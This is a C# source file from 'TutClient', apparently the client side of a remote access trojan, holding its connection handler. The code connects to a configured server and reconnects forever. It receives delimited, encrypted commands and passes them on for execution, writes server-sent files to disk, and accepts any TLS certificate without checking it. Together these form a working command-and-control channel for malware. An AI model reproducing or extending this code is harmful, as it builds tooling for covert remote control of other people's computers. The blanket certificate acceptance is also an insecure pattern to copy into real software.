using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using System.Threading.Tasks;

using TutClient.Controls;
using TutClient.Extensions;
using TutClient.Helpers;
using TutClient.Utilities;

namespace TutClient.Handlers
{
    public interface IConnectionHandler
    {
        event EventHandler<bool> RemoteDesktopShutdown;
        event EventHandler<string> SendCommand;
        event EventHandler<string> HandleCommand;
        
        bool IsDisconnected { get; set; }
        void RequestLoop();
        void DisconnectFromServer();
        void Send(byte[] data);
        void Send(byte[] data, SocketFlags socketFlags);
        void Send(byte[] data, int size, SocketFlags socketFlags);
        void Send(byte[] data, int offset, int size, SocketFlags socketFlags);
        void WriteToSslClient(byte[] buffer);
        bool IsConnected();
    }

    public class ConnectionHandler : IConnectionHandler
    {
        public event EventHandler<bool> RemoteDesktopShutdown;
        public event EventHandler<string> SendCommand;
        public event EventHandler<string> HandleCommand;

        private readonly IIpcClientHandler _ipcClientHandler;
        private readonly IDownloadUpload _downloadUpload;
        private readonly IEncoderUtil _encoderUtil;
        private readonly IEncryptionHelper _encryptionHelper;

        private Socket _clientSocket;
        private readonly SslStream _sslClient;
        private bool _isDisconnected;
        private bool _isConnectedToServer;
        private int _writeDownloadFileSize = 0;
        
        public bool IsDisconnected
        {
            get => _isDisconnected;
            set
            {
                _isDisconnected = value;
                _isConnectedToServer = !_isDisconnected;
            }
        }

        public ConnectionHandler(IIpcClientHandler ipcClientHandler,
                                 IDownloadUpload downloadUpload,
                                 IEncoderUtil encoderUtil,
                                 IEncryptionHelper encryptionHelper)
        {
            _ipcClientHandler = ipcClientHandler;
            _downloadUpload = downloadUpload;
            _encoderUtil = encoderUtil;
            _encryptionHelper = encryptionHelper;
            _clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            _sslClient = new SslStream(new NetworkStream(_clientSocket), false, ValidateSslConnection, null);
            IsDisconnected = true;

            _downloadUpload.SendByte += OnSendByte;
        }

        private void OnSendByte(object sender, byte[] bytes)
        {
            this.Send(bytes);
        }

        /// <summary>
        /// Read commands from the server
        /// </summary>
        public void RequestLoop()
        {
            while (true)
            {
                if (ApplicationSettings.IsLinuxServer)
                {
                    _sslClient.AuthenticateAsClient("");
                }

                while (_isConnectedToServer) //While the connection is alive
                {
                    ReceiveResponse(); // Receive data from the server
                }

                Console.WriteLine("Connection Ended"); //Disconnected at this point

                // Shutdown any active remote connections
                RemoteDesktopShutdown?.Invoke(this, true);

                // Shutdown ipcClient
                _ipcClientHandler.StopIpcHandler();

                //Shutdown the client, then reconnect to the server
                _clientSocket.Shutdown(SocketShutdown.Both);
                _clientSocket.Close();
                _clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

                ConnectToServer();
            }
        }

        public void DisconnectFromServer()
        {
            IsDisconnected = true;
        }

        public void Send(byte[] data)
        {
            if (!ApplicationSettings.IsLinuxServer)
            {
                this._clientSocket.Send(data);
            }
            else
            {
                this.WriteToSslClient(data);
            }
        }

        public void Send(byte[] data, SocketFlags socketFlags)
        {
            this._clientSocket.Send(data, socketFlags);
        }

        public void Send(byte[] data, int size, SocketFlags flags)
        {
            this._clientSocket.Send(data, size, flags);
        }

        public void Send(byte[] data, int offset, int size, SocketFlags socketFlags)
        {
            this._clientSocket.Send(data, offset, size, socketFlags);
        }

        public void WriteToSslClient(byte[] buffer)
        {
            _sslClient.Write(buffer);
        }

        public bool IsConnected()
        {
            return _clientSocket.Connected;
        }

        private void ConnectToServer()
        {
            var ipCache = ApplicationSettings.SocketIp.GetIpAddress();
            
            while (!_clientSocket.Connected) //Connect while the client isn't connected
            {
                try
                {
                    _clientSocket.Connect(IPAddress.Parse(ipCache), ApplicationSettings.Port); //Try to connect to the server
                    IsDisconnected = false;
                }
                catch (SocketException) //Couldn't connect to server
                {
                    // Wait one second before trying again!
                    Thread.Sleep(1000);
                }
            }

            LaunchHearthbeat();
        }

        private void ReceiveResponse()
        {
            var buffer = new byte[2048]; // The receive buffer

            try
            {
                var received = ApplicationSettings.IsLinuxServer ? _sslClient.Read(buffer, 0, 2048) : _clientSocket.Receive(buffer, SocketFlags.None);
                if(received == 0)
                {
                    return; // If failed to received data return
                } 

                var data = new byte[received]; // Create a new buffer with the exact data size
                Array.Copy(buffer, data, received); // Copy from the receive to the exact size buffer

                if (_downloadUpload.IsFileDownload) //File download is in progress
                {
                    Buffer.BlockCopy(data, 0, _downloadUpload.RecvFile, _writeDownloadFileSize, data.Length); //Copy the file data to memory

                    _writeDownloadFileSize += data.Length; //Increment the received file size

                    if (_writeDownloadFileSize == _downloadUpload.FupSize) //prev. recvFile.Length == fup_size
                    {
                        using (FileStream fs = File.Create(_downloadUpload.FupLocation))
                        {
                            byte[] info = _downloadUpload.RecvFile;
                            // Add some information to the file.
                            fs.Write(info, 0, info.Length);
                        }
                        
                        SendCommand?.Invoke(this, "frecv");

                        _writeDownloadFileSize = 0;
                        _downloadUpload.IsFileDownload = false;
                    }
                }
                else //Not downloading files
                {
                    var text = _encoderUtil.GetString(data); //Convert the data to unicode string
                    var commands = GetCommands(text); //Get command of the message

                    //Console.WriteLine(text);

                    foreach (var cmd in commands) //Loop through the commands
                    {
                        if (!ApplicationSettings.IsLinuxServer)
                        {
                            HandleCommand?.Invoke(this, _encryptionHelper.Decrypt(cmd)); //Decrypt and execute the command
                        } 
                        else
                        {
                            HandleCommand?.Invoke(this, cmd);
                        }
                    }
                }
            }
            catch (Exception)
            {
                // Restart Connection
                this.DisconnectFromServer(); 
                Console.WriteLine("Reconnecting");
            }
        }

        /// <summary>
        /// Get commands from multiple TCP packets incoming as one
        /// </summary>
        /// <param name="rawData">The string converted incoming data</param>
        /// <returns>An array of command sent by the server</returns>
        private IEnumerable<string> GetCommands(string rawData)
        {
            var commands = new List<string>(); //The command sent by the server
            var readBack = 0; //How much to read back from the current char pointer

            for (var i = 0; i < rawData.Length; i++) // Go through the message
            {
                var current = rawData[i]; //Get the current character
                if (current == '§') //If we see this char -> message delimiter
                {
                    var dataLength = int.Parse(rawData.Substring(readBack, i - readBack)); //Get the length of the command string
                    var command = rawData.Substring(i + 1, dataLength); //Get the command string itself
                    i += 1 + dataLength; //Skip the current command
                    readBack = i; //Set the read back point to here
                    commands.Add(command); //Add this command to the list
                }
            }

            return commands.ToArray(); //Return the command found
        }

        private void LaunchHearthbeat()
        {
            Task.Run(() =>
            {
                while(_isConnectedToServer)
                {
                    if(_clientSocket.Connected || (_sslClient != null && _sslClient.CanWrite))
                    {
                        //TODO: SendCommand("hearthbeat");
                    }

                    Task.Delay(10000);
                }
            });
        }

        private bool ValidateSslConnection(object sender, X509Certificate senderCert, X509Chain certChain, SslPolicyErrors errorPolicy)
        {
            return true; // TODO: add certificate pinning functionallity
        }
    }
}